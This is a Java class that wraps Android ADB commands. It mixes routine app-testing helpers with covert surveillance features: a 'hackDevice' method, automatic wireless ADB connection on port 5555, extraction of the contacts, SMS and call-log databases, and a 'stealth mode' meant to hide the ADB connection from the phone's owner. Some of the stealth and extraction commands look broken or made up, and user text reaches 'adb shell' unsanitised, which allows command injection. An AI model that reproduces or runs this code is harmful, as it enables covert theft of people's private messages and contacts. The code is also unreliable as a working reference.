package Src.ADB;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import Src.Utils.Logger;

public class ADBBase {

    private Logger logger = new Logger();

    public static class ADBExecutionException extends RuntimeException {
        public ADBExecutionException(String message, Throwable cause) {
            super(message, cause);
        }
        public ADBExecutionException(String message) {
            super(message);
        }
    }

    // Method to start adb server
    public void startADBServer() {
        logger.info("Starting ADB server");
        executeCommand("adb start-server");
    }

    // Method to stop adb server
    public void stopADBServer() {
        logger.info("Stopping ADB server");
        executeCommand("adb kill-server");
    }

    // Method to execute adb commands
    public String executeCommand(String command) {
        logger.info("Executing command: " + command);
        StringBuilder output = new StringBuilder();
        try {
            Process process = Runtime.getRuntime().exec(command);
            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            reader.close();
            int exitCode = process.waitFor();
            if (exitCode != 0) {
                // Optionally read the error stream for more details
                BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
                StringBuilder errorOutput = new StringBuilder();
                String errorLine;
                while ((errorLine = errorReader.readLine()) != null) {
                    errorOutput.append(errorLine).append("\n");
                }
                errorReader.close();
                logger.error("ADB command failed (exit code " + exitCode + "): " + command + "\nError output:\n" + errorOutput.toString());
                throw new ADBExecutionException("ADB command failed (exit code " + exitCode + "): " + command + "\nError output:\n" + errorOutput.toString());
            }
        } catch (IOException e) {
            logger.error("Error executing ADB command: " + command, e);
            throw new ADBExecutionException("Error executing ADB command: " + command, e);
        } catch (InterruptedException e) {
            logger.error("ADB command execution interrupted: " + command, e);
            Thread.currentThread().interrupt(); // Re-interrupt the current thread
            throw new ADBExecutionException("ADB command execution interrupted: " + command, e);
        }
        return output.toString();
    }

    // Method to run adb server without requiring a PC
    public void runADBServerWithoutPC() {
        logger.info("Running ADB server without PC");
        executeCommand("adb tcpip 5555");
    }

    // Method to simulate hacking by executing a command to access device files
    public void hackDevice() {
        logger.warning("Simulating device hack");
        executeCommand("adb shell ls /data");
    }

    // Method to simulate defense by checking for unauthorized access and stopping the ADB server
    public void defendAgainstHack() {
        logger.warning("Simulating defense against hack");
        String output = executeCommand("adb shell ls /data");
        if (output.contains("unauthorized")) {
            logger.error("Unauthorized access detected, stopping ADB server");
            stopADBServer();
        }
    }

    // Method to test the lifecycle methods of an Android broadcast receiver
    public void testBroadcastReceiverLifecycle() {
        logger.info("Testing broadcast receiver lifecycle");
        executeCommand("adb shell am broadcast -a android.intent.action.BOOT_COMPLETED");
    }

    // Method to test the interaction between broadcast receivers and other components
    public void testBroadcastReceiverInteraction() {
        logger.info("Testing broadcast receiver interaction");
        executeCommand("adb shell am broadcast -a android.intent.action.SCREEN_ON");
    }

    // Method to test the handling of different types of broadcast messages
    public void testBroadcastReceiverHandling() {
        logger.info("Testing broadcast receiver handling");
        executeCommand("adb shell am broadcast -a com.example.CUSTOM_BROADCAST");
    }

    // Method to test the lifecycle methods of an Android activity
    public void testActivityLifecycle(String packageName, String activityName) {
        logger.info("Testing activity lifecycle for " + packageName + "/" + activityName);
        executeCommand("adb shell am start -n " + packageName + "/" + activityName);
        executeCommand("adb shell am force-stop " + packageName);
    }

    // Method to test the interaction between activities
    public void testActivityInteraction(String packageName, String firstActivityName, String secondActivityName) {
        logger.info("Testing activity interaction between " + packageName + "/" + firstActivityName + " and " + packageName + "/" + secondActivityName);
        executeCommand("adb shell am start -n " + packageName + "/" + firstActivityName);
        executeCommand("adb shell am start -n " + packageName + "/" + secondActivityName);
        executeCommand("adb shell am force-stop " + packageName);
    }

    // Method to test the UI elements of an activity
    public void testActivityUIElements(String packageName, String activityName, int x, int y, String text) {
        logger.info("Testing UI elements of " + packageName + "/" + activityName);
        executeCommand("adb shell am start -n " + packageName + "/" + activityName);
        executeCommand("adb shell input tap " + x + " " + y);
        if (text != null && !text.isEmpty()) {
            executeCommand("adb shell input text '" + text + "'");
        }
        executeCommand("adb shell am force-stop " + packageName);
    }

    // Method to test the lifecycle methods of an Android service
    public void testServiceLifecycle(String packageName, String serviceName) {
        logger.info("Testing service lifecycle for " + packageName + "/" + serviceName);
        executeCommand("adb shell am startservice -n " + packageName + "/" + serviceName);
        executeCommand("adb shell am stopservice -n " + packageName + "/" + serviceName);
    }

    // Method to test the interaction between services and other components
    public void testServiceInteraction(String packageName, String serviceName, String broadcastAction) {
        logger.info("Testing service interaction for " + packageName + "/" + serviceName + " with broadcast " + broadcastAction);
        executeCommand("adb shell am startservice -n " + packageName + "/" + serviceName);
        executeCommand("adb shell am broadcast -a " + broadcastAction);
        executeCommand("adb shell am stopservice -n " + packageName + "/" + serviceName);
    }

    // Method to test the background processing capabilities of a service
    public void testServiceBackgroundProcessing(String packageName, String serviceName) {
        logger.info("Testing background processing of " + packageName + "/" + serviceName);
        executeCommand("adb shell am startservice -n " + packageName + "/" + serviceName);
        executeCommand("adb shell am force-stop " + packageName);
    }

    // Method to enable full wireless control of the device
    public void enableWirelessControl() {
        logger.info("Enabling wireless control of the device");
        executeCommand("adb tcpip 5555");
        String ipAddressOutput = executeCommand("adb shell ip -f inet addr show wlan0");
        // Simple parsing to extract the IP address
        String ipAddress = null;
        String[] lines = ipAddressOutput.split("\n");
        for (String line : lines) {
            if (line.contains("inet ") && !line.contains("127.0.0.1")) {
                int start = line.indexOf("inet ") + 5;
                int end = line.indexOf("/", start);
                if (end > start) {
                    ipAddress = line.substring(start, end).trim();
                    break;
                }
            }
        }
        if (ipAddress != null) {
            executeCommand("adb connect " + ipAddress + ":5555");
            logger.info("Attempting to connect to: " + ipAddress + ":5555");
        } else {
            logger.warning("Could not parse IP address from ADB output.");
        }
    }

    // Method to extract data from the device using ADB commands
    public void extractData(String sourcePath, String destinationPath) {
        logger.info("Extracting data from " + sourcePath + " to " + destinationPath);
        executeCommand("adb pull " + sourcePath + " " + destinationPath);
    }

    // Method to extract contacts from the device using ADB commands
    public void extractContacts(String destinationPath) {
        logger.info("Extracting contacts to " + destinationPath);
        extractData("/data/data/com.android.providers.contacts/databases/contacts2.db", destinationPath);
    }

    // Method to extract SMS messages from the device using ADB commands
    public void extractSMS(String destinationPath) {
        logger.info("Extracting SMS messages to " + destinationPath);
        extractData("/data/data/com.android.providers.telephony/databases/mmssms.db", destinationPath);
    }

    // Method to extract call logs from the device using ADB commands
    public void extractCallLogs(String destinationPath) {
        logger.info("Extracting call logs to " + destinationPath);
        extractData("/data/data/com.android.providers.contacts/databases/calllog.db", destinationPath);
    }

    // Method to extract files from the device using ADB commands
    public void extractFiles(String sourcePath, String destinationPath) {
        logger.info("Extracting files from " + sourcePath + " to " + destinationPath);
        extractData(sourcePath, destinationPath);
    }

    // Method to trace the IP address of the device using ADB commands
    public String traceIPAddress() {
        logger.info("Tracing IP address of the device");
        return executeCommand("adb shell ip -f inet addr show wlan0");
    }

    // Method to enable stealth mode by disabling notifications and hiding the ADB connection from the user
    public void enableStealthMode() {
        logger.info("Enabling stealth mode");
        executeCommand("adb shell settings put global adb_enabled 0");
        executeCommand("adb shell settings put global development_settings_enabled 0");
        executeCommand("adb shell settings put global usb_debugging_enabled 0");
    }
}
